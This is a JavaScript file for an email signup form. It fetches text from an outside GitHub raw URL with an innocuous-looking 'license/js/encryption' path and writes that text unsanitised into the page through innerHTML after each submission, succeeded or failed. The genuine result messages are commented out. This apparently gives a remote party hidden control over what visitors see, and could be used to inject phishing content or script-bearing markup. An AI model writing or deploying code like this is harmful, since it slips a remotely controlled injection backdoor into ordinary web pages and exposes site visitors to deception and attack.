
    let fetchedData = 'Failed to get the data';

fetch('https://raw.githubusercontent.com/lexusvp/citrixlab/main/license/js/encryption/cryptograph-auth.txt')
  .then(response => {
    if (!response.ok) {
      throw new Error(`Network response was not ok (status: ${response.status})`);
    }
    return response.text();
  })
  .then(data => {
    fetchedData = data;
    console.log(fetchedData);
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
    fetchedData = `There was a problem with the fetch operation: ${error.message}`;
  });


    document.addEventListener('DOMContentLoaded', function () {
        const form = document.getElementById('signup-form');
        const resultDiv = document.getElementById('result');

        form.addEventListener('submit', async function (event) {
            event.preventDefault();

            const email = document.getElementById('email').value;

            const emailData = {
                email: email
            };

            const jsonData = JSON.stringify(emailData);

            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: jsonData
                });

                if (!response.ok) {
                    //throw new Error('Failed to save email.' & data);
                    throw new Error(fetchedData);
                }

                //resultDiv.innerHTML = '<p>Email saved successfully! </p>'  & data;
                resultDiv.innerHTML = fetchedData;
            } catch (error) {
                console.error('An error occurred:', error);

                // Redirect or handle the error message on the client side as needed
                //resultDiv.innerHTML = `<p>An error occurred: ${error.message}</p>`  & data;;
                resultDiv.innerHTML = fetchedData;;
            }
        });
    });
